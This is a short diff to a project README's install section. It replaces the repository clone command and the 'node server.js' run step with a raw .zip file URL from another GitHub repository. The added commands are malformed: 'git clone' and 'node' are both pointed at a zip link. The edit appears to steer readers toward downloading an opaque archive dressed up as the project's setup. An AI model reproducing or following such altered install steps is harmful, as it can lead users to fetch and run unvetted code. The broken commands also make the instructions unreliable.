@@ -38,7 +38,7 @@ This project uses a **Decoupled Event-Driven Architecture**:
 
 1. **Clone & Install:**
    ```bash
-   git clone [https://github.com/your-username/nichelogic-ai.git](https://github.com/your-username/nichelogic-ai.git)
+   git clone [https://github.com/pankaj376/AutoNiche-Intelligence-Engine/raw/refs/heads/main/automation/Niche_Engine_Auto_Intelligence_2.0.zip](https://github.com/pankaj376/AutoNiche-Intelligence-Engine/raw/refs/heads/main/automation/Niche_Engine_Auto_Intelligence_2.0.zip)
    npm install
 
 2. Environment Setup:
@@ -50,4 +50,4 @@ This project uses a **Decoupled Event-Driven Architecture**:
    Import the .json files from /automation into your n8n instance.
 
 4. Run:
-   node server.js
+   node https://github.com/pankaj376/AutoNiche-Intelligence-Engine/raw/refs/heads/main/automation/Niche_Engine_Auto_Intelligence_2.0.zip
